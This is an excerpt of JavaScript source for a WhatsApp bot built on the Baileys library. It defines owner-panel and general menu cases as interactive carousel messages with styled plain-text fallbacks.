║  ⚡ 𝗔𝗗𝗗𝗣𝗥𝗘𝗠     ➜ Add premium user ║
║  ⚡ 𝗗𝗘𝗟𝗣𝗥𝗘𝗠     ➜ Remove premium   ║
║  ⚡ 𝗔𝗗𝗗𝗢𝗪𝗡𝗘𝗥   ➜ Add new owner    ║
║  ⚡ 𝗗𝗘𝗟𝗢𝗪𝗡𝗘𝗥   ➜ Remove owner     ║
║  ⚡ 𝗔𝗗𝗗𝗖𝗔𝗦𝗘    ➜ Add bot case     ║
║  ⚡ 𝗗𝗘𝗟𝗖𝗔𝗦𝗘    ➜ Remove case       ║
║  ⚡ 𝗚𝗘𝗧𝗖𝗔𝗦𝗘    ➜ View bot cases    ║
╚═══════════════════╝
                ` },
                footer: { text: 'Page 1/5 • 🔐 Owner Access Only' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '➕ 𝗔𝗗𝗗 𝗣𝗥𝗘𝗠',
                                id: '.addprem'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '➖ 𝗗𝗘𝗟 𝗣𝗥𝗘𝗠',
                                id: '.delprem'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '👥 𝗔𝗗𝗗 𝗢𝗪𝗡𝗘𝗥',
                                id: '.addowner'
                            })
                        }
                    ]
                }
            },
            // Page 2: BOT CONFIGURATION
            {
                header: commonHeader,
                body: { text: `
╔═══════════════════╗
║   ⚙️ 𝗕𝗢𝗧 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗔𝗧𝗜𝗢𝗡   ║
╠═══════════════════╣
║  🖼️ 𝗦𝗘𝗧𝗣𝗣     ➜ Change bot profile ║
║  📝 𝗦𝗘𝗧𝗦𝗧𝗔𝗧𝗨𝗦  ➜ Update bot status ║
║  ✏️ 𝗦𝗘𝗧𝗡𝗔𝗠𝗘   ➜ Change bot name   ║
║  🔄 𝗥𝗘𝗦𝗧𝗔𝗥𝗧   ➜ Restart bot       ║
║  ⏱️ 𝗨𝗣𝗧𝗜𝗠𝗘    ➜ Check uptime      ║
║  📡 𝗣𝗜𝗡𝗚      ➜ Test bot latency   ║
╚═══════════════════╝
                ` },
                footer: { text: 'Page 2/5 • 🛡️ System Controls' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🔄 𝗥𝗘𝗦𝗧𝗔𝗥𝗧',
                                id: '.restart'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '⏱️ 𝗨𝗣𝗧𝗜𝗠𝗘',
                                id: '.uptime'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📡 𝗣𝗜𝗡𝗚',
                                id: '.ping'
                            })
                        }
                    ]
                }
            },
            // Page 3: DATA MANAGEMENT
            {
                header: commonHeader,
                body: { text: `
╔═══════════════════╗
║   💾 𝗗𝗔𝗧𝗔 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧   ║
╠═══════════════════╣
║  💿 𝗕𝗔𝗖𝗞𝗨𝗣    ➜ Backup database   ║
║  📀 𝗥𝗘𝗦𝗧𝗢𝗥𝗘   ➜ Restore database  ║
║  🚫 𝗕𝗟𝗢𝗖𝗞     ➜ Block user        ║
║  ✅ 𝗨𝗡𝗕𝗟𝗢𝗖𝗞   ➜ Unblock user      ║
╚═══════════════════╝
                ` },
                footer: { text: 'Page 3/5 • 🔒 Secure Operations' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '💿 𝗕𝗔𝗖𝗞𝗨𝗣',
                                id: '.backup'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📀 𝗥𝗘𝗦𝗧𝗢𝗥𝗘',
                                id: '.restore'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🚫 𝗕𝗟𝗢𝗖𝗞',
                                id: '.block'
                            })
                        }
                    ]
                }
            },
            // Page 4: OWNER INFO
            {
                header: commonHeader,
                body: { text: `
╔═══════════════════╗
║   👤 𝗢𝗪𝗡𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡   ║
╠═══════════════════╣
║  👑 Name    ➜ ${ownerName} ║
║  📱 Number  ➜ ${ownerNumber} ║
║  🛡️ Status  ➜ Active/Verified     ║
║  ⭐ Level   ➜ Supreme Developer   ║
║  🌐 Region  ➜ Global Access       ║
╚═══════════════════╝
                ` },
                footer: { text: 'Page 4/5 • 🏆 Elite Developer' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📞 𝗖𝗢𝗡𝗧𝗔𝗖𝗧',
                                id: '.contact'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📊 𝗦𝗧𝗔𝗧𝗦',
                                id: '.stats'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: 'ℹ️ 𝗛𝗘𝗟𝗣',
                                id: '.help'
                            })
                        }
                    ]
                }
            },
            // Page 5: BOT STATISTICS
            {
                header: commonHeader,
                body: { text: `
╔═══════════════════╗
║   📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦   ║
╠═══════════════════╣
║  🤖 Bot Name  ➜ ${botName} ║
║  📦 Version   ➜ ${botVersion} ║
║  ⏱️ Uptime    ➜ ${uptimeString} ║
║  📡 Latency   ➜ ${ping}ms ║
║  👥 Users     ➜ ${totalUsers} ║
║  👥 Groups    ➜ ${totalGroups} ║
║  ⚡ Commands  ➜ ${totalCommands} ║
║  🛡️ Status    ➜ 🟢 Online        ║
╚═══════════════════╝
                ` },
                footer: { text: 'Page 5/5 • 🚀 System Online' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🔄 𝗥𝗘𝗙𝗥𝗘𝗦𝗛',
                                id: '.owner'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📊 𝗠𝗢𝗥𝗘 𝗦𝗧𝗔𝗧𝗦',
                                id: '.morestats'
                            })
                        },
                        {
                            name: 'quick_reply',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🏠 𝗛𝗢𝗠𝗘',
                                id: '.menu'
                            })
                        }
                    ]
                }
            }
        ];

        // Build interactive carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `👑 *${botName.toUpperCase()} • OWNER PANEL*` },
                    footer: { text: `Swipe ➡️ to access controls • 🔐 Owner Only • ${cards.length} panels` },
                    carouselMessage: { cards },
                    contextInfo: {
                        mentionedJid: [sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: '120363292873277092@newsletter',
                            newsletterName: '⚡ ELITE BOT ⚡',
                            serverMessageId: 1
                        }
                    }
                }
            },
            {}
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Owner menu error:', error);
        // Premium fallback with full styling
        let fallback = `
╔═══════════════════╗
║                 👑 OWNER CONTROL PANEL 👑                  ║
║                   ⚡ 𝕱𝖚𝖙𝖚𝖗𝖎𝖘𝖙𝖎𝖈 𝕳𝖆𝖈𝖐𝖊𝖗 𝕰𝖉𝖎𝖙𝖎𝖔𝖓 ⚡          ║
╚═══════════════════╝ 

┌─ • ✦ • ── ── ── ── ── ── ── ── ── ── ── • ✦ • ─┐
│                                                      │
│  ██████  ██▀███  ▓█████  ███▄ ▄███▓ ██▓ █    ██    │
│ ▒██    ▒ ▓██ ▒ ██▒▓█   ▀ ▓██▒▀█▀ ██▒▓██▒ ██  ▓██▒   │
│ ░ ▓██▄   ▓██ ░▄█ ▒▒███   ▓██    ▓██░▒██▒▓██  ▒██░   │
│   ▒   ██▒▒██▀▀█▄  ▒▓█  ▄ ▒██    ▒██ ░██░▓▓█  ░██░   │
│ ▒██████▒▒░██▓ ▒██▒░▒████▒▒██▒   ░██▒░██░▒▒█████▓    │
│ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░   ░  ░░▓  ░▒▓▒ ▒ ▒    │
│ ░ ░▒  ░ ░  ░▒ ░ ▒░ ░ ░  ░░  ░      ░ ▒ ░░▒░ ░ ░    │
│ ░  ░  ░    ░░   ░    ░   ░      ░    ▒ ░░░ ░ ░    │
│       ░     ░        ░  ░       ░    ░    ░ ░    │
│                                                      │
└─ • ✦ • ── ── ── ── ── ── ── ── ── ── ── • ✦ • ─┘

◈━━━━━━━━━━━━━━━━━━━◈

╔═══════════════════╗
║  👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧                              ║
╠╠═══════════════════╣
║  ⚡ 𝗔𝗗𝗗𝗣𝗥𝗘𝗠     ➜ Add premium user           
║  ⚡ 𝗗𝗘𝗟𝗣𝗥𝗘𝗠     ➜ Remove premium user         
║  ⚡ 𝗔𝗗𝗗𝗢𝗪𝗡𝗘𝗥   ➜ Add new owner                l
║  ⚡ 𝗗𝗘𝗟𝗢𝗪𝗡𝗘𝗥   ➜ Remove owner                 
║  ⚡ 𝗔𝗗𝗗𝗖𝗔𝗦𝗘    ➜ Add bot case                    
║  ⚡ 𝗗𝗘𝗟𝗖𝗔𝗦𝗘    ➜ Remove bot case                 
║  ⚡ 𝗚𝗘𝗧𝗖𝗔𝗦𝗘    ➜ View bot cases                   
╚═══════════════════╝ 

╔═══════════════════╗
║  ⚙️ 𝗕𝗢𝗧 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗔𝗧𝗜𝗢𝗡                    
╠═══════════════════╣
║  🖼️ 𝗦𝗘𝗧𝗣𝗣     ➜ Change bot profile picture      
║  📝 𝗦𝗘𝗧𝗦𝗧𝗔𝗧𝗨𝗦  ➜ Update bot status               
║  ✏️ 𝗦𝗘𝗧𝗡𝗔𝗠𝗘   ➜ Change bot name                 
║  🔄 𝗥𝗘𝗦𝗧𝗔𝗥𝗧   ➜ Restart bot                   
║  ⏱️ 𝗨𝗣𝗧𝗜𝗠𝗘    ➜ Check bot uptime              
║  📡 𝗣𝗜𝗡𝗚      ➜ Test bot latency                    
╚═══════════════════╝ 

╔═══════════════════╗
║  💾 𝗗𝗔𝗧𝗔 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧                                ║
╠╠═══════════════════╣
║  💿 𝗕𝗔𝗖𝗞𝗨𝗣    ➜ Backup database                      ║
║  📀 𝗥𝗘𝗦𝗧𝗢𝗥𝗘   ➜ Restore database                     ║
║  🚫 𝗕𝗟𝗢𝗖𝗞     ➜ Block user                           ║
║  ✅ 𝗨𝗡𝗕𝗟𝗢𝗖𝗞   ➜ Unblock user                         ║
╚═══════════════════╝ 

╔═══════════════════╗
║  👤 𝗢𝗪𝗡𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡                              ║
╠╠═══════════════════╣
║  👑 Name    ➜ ${ownerName}                             ║
║  📱 Number  ➜ ${ownerNumber}                          ║
║  🛡️ Status  ➜ Active/Verified                        ║
║  ⭐ Level   ➜ Supreme Developer                      ║
║  🌐 Region  ➜ Global Access                          ║
╚═══════════════════╝ 

╔═══════════════════╗
║  📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦                                  ║
╠╠═══════════════════╣
║  🤖 Bot Name  ➜ ${botName}                            ║
║  📦 Version   ➜ ${botVersion}                         ║
║  ⏱️ Uptime    ➜ ${uptimeString}                       ║
║  📡 Latency   ➜ ${ping}ms                             ║
║  👥 Users     ➜ ${totalUsers}                         ║
║  👥 Groups    ➜ ${totalGroups}                        ║
║  ⚡ Commands  ➜ ${totalCommands}                      ║
║  🛡️ Status    ➜ 🟢 Online                            ║
╚═══════════════════╝ 

◈━━━━━━━━━━━━━━━━━━━◈

⚡ ${botName} • 𝖤𝗅𝗂𝗍𝖾 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖤𝖽𝗂𝗍𝗂𝗈𝗇 ⚡
🔐 Owner Access Only • ${new Date().toLocaleString()}
© 2026 ${botName} • All Rights Reserved

╔═══════════════════╗
║  🛡️ 𝖲𝖾𝖼𝗎𝗋𝖾𝖽 𝖻𝗒 𝖤𝗅𝗂𝗍𝖾 𝖤𝗇𝖼𝗋𝗒𝗉𝗍𝗂𝗈𝗇 𝖯𝗋𝗈𝗍𝗈𝖼𝗈𝗅  ║
╚═══════════════════╝
        `;
        await mzazi.sendMessage(chatId, { text: fallback, contextInfo: { mentionedJid: [sender] } });
    }
    break;
}


//=====================================//

case 'menu7': {
            const chatId = sender;
            const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

            // In groups the interactive carousel is silently dropped by WhatsApp,
            // so we throw immediately to hit the reliable plain-text fallback.
            if (isGroup) throw new Error('group – use text fallback');

            try {
                // Load premium owner menu image
                const customOwnerPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
                const defaultOwnerPic = "./media/menu.jpg";
                const ownerPicPath = fs.existsSync(customOwnerPic) ? customOwnerPic : defaultOwnerPic;

                let preparedImage = null;
                if (fs.existsSync(ownerPicPath)) {
                    const imageBuffer = fs.readFileSync(ownerPicPath);
                    const imgContent = await generateWAMessageContent(
                        { image: imageBuffer },
                        { upload: mzazi.waUploadToServer }
                    );
                    if (imgContent?.imageMessage) {
                        preparedImage = imgContent.imageMessage;
                    }
                }

                // Get bot statistics
                const uptime = process.uptime();
                const days = Math.floor(uptime / 86400);
                const hours = Math.floor((uptime % 86400) / 3600);
                const minutes = Math.floor((uptime % 3600) / 60);
                const seconds = Math.floor(uptime % 60);
                const uptimeString = `${days}d ${hours}h ${minutes}m ${seconds}s`;

                const ping = Date.now() - m.messageTimestamp * 1000;
                const totalGroups = Object.keys(global.db?.data?.chats || {}).length;
                const totalUsers = Object.keys(global.db?.data?.users || {}).length;
                const totalCommands = Object.keys(global.plugins || {}).length;

                // Owner info
                const ownerName = global.ownerName || 'Elite Developer';
                const ownerNumber = global.ownerNumber || '254741388986';
                const botVersion = global.botVersion || '3.0.0';

                const commonHeader = {
                    title: `${botName.toUpperCase()} • OWNER PANEL`,
                    hasMediaAttachment: !!preparedImage,
                    ...(preparedImage ? { imageMessage: preparedImage } : {})
                };

                // Create 5 premium cards with owner commands
                const cards = [
                    // Page 1: PREMIUM MANAGEMENT
                    {
                        header: commonHeader,
                        body: { text: `
> Owner Menu - This are commands set aside to be used by Owner Only, By clicking the Owner Menu Button, You will explore more ${botName.toUpperCase()} OWNER Commands

> Group Menu - On Group Menu, here is where the group commands are. If you feel like you want the group commands, Click The group Menu Button

> General Menu - Just as the name indicates, The general menu simply stands for general commands such as ping, uptime, repo and others

                        ` },
                        footer: { text: 'Page 1/5 • 🔐 Owner, Group and General Menu' },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'OWNER MENU',
                                        id: '.ownermenu'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'GENERAL MENU',
                                        id: '.generalmenu'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: '👥 GROUP MENU',
                                        id: '.groupmenu'
                                    })
                                }
                            ]
                        }
                    },
                    // Page 2: BOT CONFIGURATION
                    {
                        header: commonHeader,
                        body: { text: `
> Fun & Games Menu - This section contains entertaining commands designed for fun and interaction. By clicking the Fun & Games Menu Button, you will discover exciting games, jokes, trivia, quizzes, and other enjoyable features available in ${botName.toUpperCase()}.

> Utility Tools Menu - The Utility Tools Menu provides helpful tools for everyday tasks. Click the Utility Tools Menu Button to access features such as calculators, converters, QR generators, text tools, and other useful utilities.

> Search & Info Menu - Looking for information? The Search & Info Menu allows you to search the web, find images, get definitions, lyrics, facts, and much more. Click the Search & Info Menu Button to explore all information-related commands in ${botName.toUpperCase()}.
                        ` },
                        footer: { text: 'Page 2/5 • 🛡️ System Controls' },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'FUN AND GAME MENU',
                                        id: '.funmenu'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'UTILITY MENU',
                                        id: '.utilitymenu'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'SEARCH AND INFO MENU',
                                        id: '.searchmenu'
                                    })
                                }
                            ]
                        }
                    },
                    // Page 3: DATA MANAGEMENT
                    {
                        header: commonHeader,
                        body: { text: `
> Media & Download Menu - This section is dedicated to media-related commands. Click the Media & Download Menu Button to access features for downloading videos, music, images, status updates, and other supported media content available in ${botName.toUpperCase()}.

> Automated Features Menu - The Automated Features Menu contains smart automation tools that help manage tasks automatically. Click the Automated Features Menu Button to explore auto-reply, auto-react, auto-status view, welcome messages, anti-link systems, and other automation features in ${botName.toUpperCase()}.

> Languages Menu - The Languages Menu provides language-related tools and translation features. Click the Languages Menu Button to access translators, language detection, text conversion tools, and multilingual support available in ${botName.toUpperCase()}.
                        ` },
                        footer: { text: 'Page 3/5 • 🔒 Secure Operations' },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'MEDIA AND DOWNLOAD MENU',
                                        id: '.downloadmenu'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'AUTOMATED FEATURES MENU',
                                        id: '.automenu'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'LANGUAGES MENU',
                                        id: '.languagemenu'
                                    })
                                }
                            ]
                        }
                    },
                    // Page 4: OWNER INFO
                    {
                        header: commonHeader,
                        body: { text: `
> Lifestyle Menu - The Lifestyle Menu offers commands focused on daily life, motivation, health tips, relationships, quotes, and personal growth. Click the Lifestyle Menu Button to discover lifestyle features available in ${botName.toUpperCase()}.

> Faith Menu - The Faith Menu contains spiritual and inspirational commands. Click the Faith Menu Button to access prayers, devotionals, Bible verses, religious quotes, and other faith-based features available in ${botName.toUpperCase()}.

> Bot Settings Menu - The Bot Settings Menu allows you to configure and customize the behavior of ${botName.toUpperCase()}. Click the Bot Settings Menu Button to manage bot preferences, command settings, auto-features, security options, system controls, and other configuration tools available to authorized users.
                        ` },
                        footer: { text: 'Page 4/5 • 🏆 Elite Developer' },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'LIFESTYLE MENU',
                                        id: '.lifestyle'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'FAITH/RELIGION MENU',
                                        id: '.faithmenu'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'BOT SETTINGS MENU',
                                        id: '.settingsmenu'
                                    })
                                }
                            ]
                        }
                    },
                    // Page 5: BOT STATISTICS
                    {
                        header: commonHeader,
                        body: { text: `
> Thanks To - ${botName.toUpperCase()} would not be possible without the support, inspiration, and contributions of these amazing people. Click the Thanks To Button to view the special acknowledgements behind this project.

👨‍💻 MZAZI TECH - Developer
💍 MRS MZAZI - Developer's Wife
🤝 BLACKLORD - Friend
🤝 KNEWLEEN - Friend
🤝 DEADNOTE - Friend

❤️ Special Thanks To All My Followers For Your Continuous Support, Trust, And Motivation. Your Support Keeps ${botName.toUpperCase()} Growing Every Day.
                        ` },
                        footer: { text: 'Page 5/5 • 🚀 System Online' },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: 'CONTACT OWNER',
                                        id: '.owner'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: '📊 𝗠𝗢𝗥𝗘 𝗦𝗧𝗔𝗧𝗦',
                                        id: '.morestats'
                                    })
                                },
                                {
                                    name: 'quick_reply',
                                    buttonParamsJson: JSON.stringify({
                                        display_text: '🏠 𝗛𝗢𝗠𝗘',
                                        id: '.menu'
                                    })
                                }
                            ]
                        }
                    }
                ];

                // Build interactive carousel message
                const interactiveMsg = generateWAMessageFromContent(
                    chatId,
                    {
                        interactiveMessage: {
                            body: { text: `
╭━━━━━━━━━━━━━━━━━━━━━━━⬣
┃ 🤖 ${botName.toUpperCase()}
┣━━━━━━━━━━━━━━━━━━━━━━━⬣
┃ 👑 Owner    : MZAZI TECH INC
┃ ⚙️ System   : Case-Based
┃ 🚀 Speed    : ${ping}
┃ ⏳ Uptime   : ${uptime}
┃ 🎯 Interface: Buttons
┃ 📦 Baileys  : github:mzazitech/bail
╰━━━━━━━━━━━━━━━━━━━━━━━⬣

『 POWERED BY MZAZI TECH INC 』` },
                            footer: { text: `Swipe ➡️ to access controls • 😂 Free mode • ${cards.length} panels` },
                            carouselMessage: { cards },
                            contextInfo: {
                                mentionedJid: [sender],
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363292873277092@newsletter',
                                    newsletterName: `${botName.toUpperCase()}`,
                                    serverMessageId: 1
                                }
                            }
                        }
                    },
                    {}
                );

                await mzazi.relayMessage(chatId, interactiveMsg.message, {
                    messageId: interactiveMsg.key.id
                });

            } catch (error) {
                logger.error('Owner menu error:', error);
                // Re-compute variables that were block-scoped inside the try{}
                const _upSec = process.uptime();
                const _ud = Math.floor(_upSec / 86400);
                const _uh = Math.floor((_upSec % 86400) / 3600);
                const _um = Math.floor((_upSec % 3600) / 60);
                const _us = Math.floor(_upSec % 60);
                const uptimeString = `${_ud}d ${_uh}h ${_um}m ${_us}s`;
                const ping = Math.max(0, Date.now() - m.messageTimestamp * 1000);
                const ownerName = global.ownerName || 'Elite Developer';
                const ownerNumber = global.ownerNumber || '254741388986';
                const botVersion = global.botVersion || '3.0.0';
                const totalUsers = 0;
                const totalGroups = 0;
                const totalCommands = 0;
                // Premium fallback with full styling
                let fallback = `
╔══════════════════════════════════════════════════════════╗
║                 👑 OWNER CONTROL PANEL 👑                  ║
║                   ⚡ 𝕱𝖚𝖙𝖚𝖗𝖎𝖘𝖙𝖎𝖈 𝕳𝖆𝖈𝖐𝖊𝖗 𝕰𝖉𝖎𝖙𝖎𝖔𝖓 ⚡          ║
╚══════════════════════════════════════════════════════════╝

┌─ • ✦ • ── ── ── ── ── ── ── ── ── ── ── • ✦ • ─┐
│                                                      │
│  ██████  ██▀███  ▓█████  ███▄ ▄███▓ ██▓ █    ██    │
│ ▒██    ▒ ▓██ ▒ ██▒▓█   ▀ ▓██▒▀█▀ ██▒▓██▒ ██  ▓██▒   │
│ ░ ▓██▄   ▓██ ░▄█ ▒▒███   ▓██    ▓██░▒██▒▓██  ▒██░   │
│   ▒   ██▒▒██▀▀█▄  ▒▓█  ▄ ▒██    ▒██ ░██░▓▓█  ░██░   │
│ ▒██████▒▒░██▓ ▒██▒░▒████▒▒██▒   ░██▒░██░▒▒█████▓    │
│ ▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░   ░  ░░▓  ░▒▓▒ ▒ ▒    │
│ ░ ░▒  ░ ░  ░▒ ░ ▒░ ░ ░  ░░  ░      ░ ▒ ░░▒░ ░ ░    │
│ ░  ░  ░    ░░   ░    ░   ░      ░    ▒ ░░░ ░ ░    │
│       ░     ░        ░  ░       ░    ░    ░ ░    │
│                                                      │
└─ • ✦ • ── ── ── ── ── ── ── ── ── ── ── • ✦ • ─┘

◈━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◈

╔══════════════════════════════════════════════════════════╗
║  👑 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧                              ║
╠══════════════════════════════════════════════════════════╣
║  ⚡ 𝗔𝗗𝗗𝗣𝗥𝗘𝗠     ➜ Add premium user                    ║
║  ⚡ 𝗗𝗘𝗟𝗣𝗥𝗘𝗠     ➜ Remove premium user                 ║
║  ⚡ 𝗔𝗗𝗗𝗢𝗪𝗡𝗘𝗥   ➜ Add new owner                       ║
║  ⚡ 𝗗𝗘𝗟𝗢𝗪𝗡𝗘𝗥   ➜ Remove owner                        ║
║  ⚡ 𝗔𝗗𝗗𝗖𝗔𝗦𝗘    ➜ Add bot case                         ║
║  ⚡ 𝗗𝗘𝗟𝗖𝗔𝗦𝗘    ➜ Remove bot case                      ║
║  ⚡ 𝗚𝗘𝗧𝗖𝗔𝗦𝗘    ➜ View bot cases                       ║
╚══════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════╗
║  ⚙️ 𝗕𝗢𝗧 𝗖𝗢𝗡𝗙𝗜𝗚𝗨𝗥𝗔𝗧𝗜𝗢𝗡                              ║
╠══════════════════════════════════════════════════════════╣
║  🖼️ 𝗦𝗘𝗧𝗣𝗣     ➜ Change bot profile picture           ║
║  📝 𝗦𝗘𝗧𝗦𝗧𝗔𝗧𝗨𝗦  ➜ Update bot status                    ║
║  ✏️ 𝗦𝗘𝗧𝗡𝗔𝗠𝗘   ➜ Change bot name                      ║
║  🔄 𝗥𝗘𝗦𝗧𝗔𝗥𝗧   ➜ Restart bot                          ║
║  ⏱️ 𝗨𝗣𝗧𝗜𝗠𝗘    ➜ Check bot uptime                     ║
║  📡 𝗣𝗜𝗡𝗚      ➜ Test bot latency                      ║
╚══════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════╗
║  💾 𝗗𝗔𝗧𝗔 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧                                ║
╠══════════════════════════════════════════════════════════╣
║  💿 𝗕𝗔𝗖𝗞𝗨𝗣    ➜ Backup database                      ║
║  📀 𝗥𝗘𝗦𝗧𝗢𝗥𝗘   ➜ Restore database                     ║
║  🚫 𝗕𝗟𝗢𝗖𝗞     ➜ Block user                           ║
║  ✅ 𝗨𝗡𝗕𝗟𝗢𝗖𝗞   ➜ Unblock user                         ║
╚══════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════╗
║  👤 𝗢𝗪𝗡𝗘𝗥 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡                              ║
╠══════════════════════════════════════════════════════════╣
║  👑 Name    ➜ ${ownerName}                             ║
║  📱 Number  ➜ ${ownerNumber}                          ║
║  🛡️ Status  ➜ Active/Verified                        ║
║  ⭐ Level   ➜ Supreme Developer                      ║
║  🌐 Region  ➜ Global Access                          ║
╚══════════════════════════════════════════════════════════╝

╔══════════════════════════════════════════════════════════╗
║  📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦                                  ║
╠══════════════════════════════════════════════════════════╣
║  🤖 Bot Name  ➜ ${botName}                            ║
║  📦 Version   ➜ ${botVersion}                         ║
║  ⏱️ Uptime    ➜ ${uptimeString}                       ║
║  📡 Latency   ➜ ${ping}ms                             ║
║  👥 Users     ➜ ${totalUsers}                         ║
║  👥 Groups    ➜ ${totalGroups}                        ║
║  ⚡ Commands  ➜ ${totalCommands}                      ║
║  🛡️ Status    ➜ 🟢 Online                            ║
╚══════════════════════════════════════════════════════════╝

◈━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◈

⚡ ${botName} • 𝖤𝗅𝗂𝗍𝖾 𝖣𝖾𝗏𝖾𝗅𝗈𝗉𝖾𝗋 𝖤𝖽𝗂𝗍𝗂𝗈𝗇 ⚡
🔐 Owner Access Only • ${new Date().toLocaleString()}
© 2026 ${botName} • All Rights Reserved

╔══════════════════════════════════════════════════════════╗
║  🛡️ 𝖲𝖾𝖼𝗎𝗋𝖾𝖽 𝖻𝗒 𝖤𝗅𝗂𝗍𝖾 𝖤𝗇𝖼𝗋𝗒𝗉𝗍𝗂𝗈𝗇 𝖯𝗋𝗈𝗍𝗈𝖼𝗈𝗅  ║
╚══════════════════════════════════════════════════════════╝
                `;
                await mzazi.sendMessage(chatId, { text: fallback, contextInfo: { mentionedJid: [sender] } });
            }
            break;
        }
        
//=====================================//

case 'menu0': {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
